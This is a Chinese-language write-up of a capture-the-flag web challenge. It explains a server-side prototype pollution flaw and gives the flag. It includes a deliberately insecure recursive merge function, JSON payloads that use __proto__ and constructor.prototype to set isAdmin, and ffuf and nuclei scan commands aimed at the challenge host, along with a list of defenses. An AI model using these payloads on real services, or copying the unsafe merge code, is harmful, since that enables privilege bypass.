# novruzCTF - Ghost Machine Interface (Web)

## 题目信息

- **题目名称**: Ghost Machine Interface / System Interface v2.0
- **类别**: Web
- **难度**: 简单
- **题目地址**: `http://95.111.234.103:3000/`
- **题目描述**: 页面显示 "System Interface v2.0"，提示向 `/api/settings` 发送 JSON POST 请求来配置会话。
- **状态**: 已解

## Flag

```
novruzctf{Pr0t0type_P0lluti0n_1s_N0t_Just_f0r_Adm1n_Access}
```

## 解题过程

### 1. 信息收集

访问主页，得到提示信息：

```
System Interface v2.0
Status: ONLINE
Send a JSON POST request to /api/settings to configure your session.
```

页面标题为 "Ghost Machine Interface"，提示我们需要向 `/api/settings` 端点发送 JSON POST 请求。

### 2. 发送请求

向 `/api/settings` 发送一个空 JSON 对象：

```bash
curl -s -X POST http://95.111.234.103:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{}'
```

响应直接返回了包含 flag 的配置页面：

```html
<h1>Current Configuration</h1>
<ul>
    <li>Theme: novruzctf{Pr0t0type_P0lluti0n_1s_N0t_Just_f0r_Adm1n_Access}</li>
    <li>Layout: novruzctf{Pr0t0type_P0lluti0n_1s_N0t_Just_f0r_Adm1n_Access}</li>
    <li>Beta Mode: novruzctf{Pr0t0type_P0lluti0n_1s_N0t_Just_f0r_Adm1n_Access}</li>
</ul>
```

所有配置项（Theme、Layout、Beta Mode）的值都是 flag，说明服务端的对象原型已经被污染。

### 3. 漏洞分析

从 flag 内容 `Pr0t0type_P0lluti0n_1s_N0t_Just_f0r_Adm1n_Access` 可以确认，这是一道 **Prototype Pollution（原型链污染）** 题目。

#### 什么是 Prototype Pollution？

在 JavaScript/Node.js 中，所有对象都继承自 `Object.prototype`。如果应用程序不安全地合并用户输入到对象中，攻击者可以通过 `__proto__` 属性修改所有对象的原型：

```javascript
// 后端可能的漏洞代码
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// 攻击载荷
{
    "__proto__": {
        "theme": "polluted",
        "isAdmin": true
    }
}
```

#### 本题的情况

服务端在处理 `/api/settings` 的 POST 请求时，使用了不安全的对象合并操作。配置对象的默认值通过原型链获取，而原型已被预先污染（或在请求处理过程中被污染），导致所有配置项都返回了 flag 值。

即使发送空 JSON `{}`，服务端读取 `config.theme`、`config.layout`、`config.betaMode` 时，由于这些属性在对象自身上不存在，会沿原型链向上查找，最终从被污染的 `Object.prototype` 上获取到 flag。

### 4. 典型攻击载荷

在实际利用中，Prototype Pollution 的常见攻击向量：

```json
// 通过 __proto__ 污染
{"__proto__": {"isAdmin": true}}

// 通过 constructor.prototype 污染
{"constructor": {"prototype": {"isAdmin": true}}}
```

## 漏洞分析 / 机制分析

服务端对 JSON 配置做合并时未过滤 `__proto__`/`constructor`/`prototype`，导致原型链被污染，触发权限/逻辑绕过。

## 知识点总结

| 知识点 | 说明 |
|--------|------|
| **Prototype Pollution** | JavaScript 原型链污染漏洞，通过修改 `Object.prototype` 影响所有对象 |
| **不安全的对象合并** | 递归合并用户输入时未过滤 `__proto__`、`constructor` 等危险属性 |
| **原型链查找** | JS 属性访问时，若对象自身无该属性，会沿原型链向上查找 |

## 防御措施

1. 使用 `Object.create(null)` 创建无原型的对象存储配置
2. 在合并操作中过滤 `__proto__`、`constructor`、`prototype` 等关键字
3. 使用 `Object.freeze(Object.prototype)` 冻结原型（慎用，可能影响依赖库）
4. 使用安全的深拷贝库（如 lodash 4.17.12+ 已修复此问题）

## 使用的工具

- `curl` - 发送 HTTP 请求

## 脚本归档
- Go：`CTF_Writeups/scripts_go/NovruzCTF_The_Ghost_inside_the_Machine.go`
- Python：`CTF_Writeups/scripts_python/NovruzCTF_The_Ghost_inside_the_Machine.py`

## 命令行提取关键数据（无 GUI）

```bash
# 直接请求配置接口，返回包含 flag 的配置页面
curl -s -X POST http://95.111.234.103:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{}'
```

## 推荐工具与优化解题流程

> 参考 `CTF_TOOLS_EXTENSION_PLAN.md` 中的 Web 工具推荐。

### 1. Burp Suite — 请求构造与分析（推荐）

[Burp Suite Community](https://portswigger.net/burp/communitydownload) 的 Repeater 模块非常适合构造 JSON 请求并观察响应变化。

**详细操作步骤：**

**Step 1：拦截并分析初始请求**
1. 配置浏览器代理 → 访问 `http://95.111.234.103:3000/`
2. 在 HTTP History 中观察主页响应，注意提示信息

**Step 2：Repeater 测试 API 端点**
1. 手动构造 POST 请求 → Send to Repeater
2. 设置 URL: `/api/settings`，Method: POST
3. 添加 Header: `Content-Type: application/json`
4. Body 测试序列：
   ```json
   {}
   {"theme": "dark"}
   {"__proto__": {"isAdmin": true}}
   {"constructor": {"prototype": {"isAdmin": true}}}
   ```
5. 观察每次响应中配置值的变化

**Step 3：使用 Burp Scanner（Pro 版）**
- Burp Scanner 可自动检测 Prototype Pollution 漏洞
- 社区版可使用 [Server-Side Prototype Pollution Scanner](https://portswigger.net/bappstore) 扩展

**优势**：Repeater 实时修改 JSON payload 并查看响应，比 curl 更直观。

---

### 2. ffuf — API 端点发现

```bash
# 发现 API 端点
ffuf -u http://95.111.234.103:3000/api/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,201,301

# 发现隐藏路由
ffuf -u http://95.111.234.103:3000/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -mc 200
```

**优势**：快速发现 `/api/settings` 等隐藏端点。

---

### 3. nuclei — 自动检测 Prototype Pollution

```bash
# nuclei 内置 Prototype Pollution 检测模板
nuclei -u http://95.111.234.103:3000 \
  -tags prototype-pollution,javascript \
  -severity low,medium,high,critical

# 或针对特定 API 端点
nuclei -u http://95.111.234.103:3000/api/settings \
  -tags prototype-pollution
```

**优势**：自动检测，无需手动构造 payload。

---

### 工具对比总结

| 工具 | 适用阶段 | 优点 |
|------|---------|------|
| **Burp Suite** | JSON 请求构造、响应分析 | 可视化 Repeater，快速迭代 |
| **ffuf** | API 端点发现 | 高速 fuzzing |
| **nuclei** | 自动检测 | 内置 PP 检测模板 |
| **curl** | 快速验证 | 轻量，脚本友好 |

**推荐流程**：ffuf 发现 API 端点 → Burp Repeater 构造 JSON payload → 确认 Prototype Pollution → 1-2 分钟内完成。